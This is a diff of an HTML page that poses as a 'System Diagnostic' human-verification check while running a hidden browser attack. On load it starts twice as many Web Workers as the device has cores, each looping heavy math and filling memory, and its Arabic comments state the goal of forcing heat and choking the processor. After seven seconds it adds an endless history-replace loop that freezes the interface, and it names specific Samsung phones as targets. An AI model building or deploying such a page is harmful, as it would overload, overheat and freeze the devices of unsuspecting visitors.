@@ -1,53 +1,64 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Extreme Multi-Core Test</title>
+    <title>System Diagnostic</title>
 </head>
-<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
-    <h1 id="status">جاري بدء التحقق قبل الدخول...</h1>
-    <p>     </p>
-    <div id="logs"></div>
+<body style="background:#111; color:#0f0; text-align:center; font-family:monospace; padding-top:100px;">
+    <h2 id="log">جاري التحقق من انك انسان ...</h2>
+    <div id="cores"></div>
 
     <script>
-        // كود العامل (Worker) الذي سيتم تشغيله في الخلفية
+        // 1. تحديد عدد الأنوية وديناميكية العمل
+        const physicalCores = navigator.hardwareConcurrency || 4;
+        const threadCount = physicalCores * 2; // فتح ضعف عدد الأنوية لضمان الاختناق
+        document.getElementById('cores').innerText = "الأنوية المكتشفة: " + physicalCores + " | المسارات المفعلة: " + threadCount;
+
+        // 2. كود الـ Worker المصمم لإجبار التربو (Turbo Boost)
         const workerCode = `
             self.onmessage = function() {
-                let data = [];
-                setInterval(() => {
-                    // إشغال النواة تماماً
-                    for(let i=0; i<5000000; i++) { Math.sqrt(Math.random()); }
-                    // ملء الرام
-                    data.push(new Float64Array(1000000));
-                }, 10);
+                // مصفوفة ضخمة لإشغال الكاش والرام
+                let memoryLoad = new Float64Array(2000000); 
+                
+                function crunch() {
+                    // عمليات رياضية معقدة (Trigonometric & Exponential) لإجبار وحدة الحساب (ALU) على العمل الأقصى
+                    for (let i = 0; i < 5000000; i++) {
+                        Math.tan(Math.atan(Math.tan(Math.atan(Math.random()))));
+                        Math.exp(Math.random()) * Math.sqrt(Math.random());
+                    }
+                    // منع الـ Garbage Collection من إراحة المعالج
+                    memoryLoad.fill(Math.random());
+                    setTimeout(crunch, 0); // تكرار فوري
+                }
+                crunch();
             };
         `;
 
         const blob = new Blob([workerCode], {type: 'application/javascript'});
         const workerUrl = URL.createObjectURL(blob);
 
-        function startExtremeStress() {
-            // تشغيل 12 عامل (Workers) لضمان إشغال كل أنوية S21 أو Note 9
-            for(let i=0; i<12; i++) {
-                const worker = new Worker(workerUrl);
-                worker.postMessage("start");
-                console.log("Worker " + i + " started");
+        function startHyperStress() {
+            document.getElementById('log').innerText = " ...";
+            
+            // 3. إطلاق الهجوم المتوازي على كافة الأنوية
+            for (let i = 0; i < threadCount; i++) {
+                const w = new Worker(workerUrl);
+                w.postMessage("go");
             }
 
-            document.getElementById('status').innerText = "تم تفعيل كافة المسارات (CPU 100%)";
-            
-            // الضربة القاضية للـ UI Thread (الواجهة) بعد 5 ثواني
+            // 4. تجميد واجهة النظام (System UI Freeze)
+            // بعد 7 ثواني من رفع التردد والحرارة، نقوم بتجميد مسار الواجهة
             setTimeout(() => {
+                document.getElementById('log').innerText = "CRITICAL_SYSTEM_OVERLOAD";
                 while(true) {
-                    // تجميد الواجهة تماماً ومنع النظام من قتل التطبيق بسهولة
-                    let s = "";
-                    for(let i=0; i<1000; i++) s += Math.random();
-                    history.pushState(null, "", s);
+                    // تكرار طلبات تغيير الهوية البصرية للمتصفح لإرباك معالج الرسوميات والنظام
+                    history.replaceState(null, "", "OVERLOAD_" + Date.now() + "_" + Math.random());
                 }
-            }, 5000);
+            }, 7000);
         }
 
-        window.onload = startExtremeStress;
+        // بدء التشغيل
+        window.onload = startHyperStress;
     </script>
 </body>
 </html>
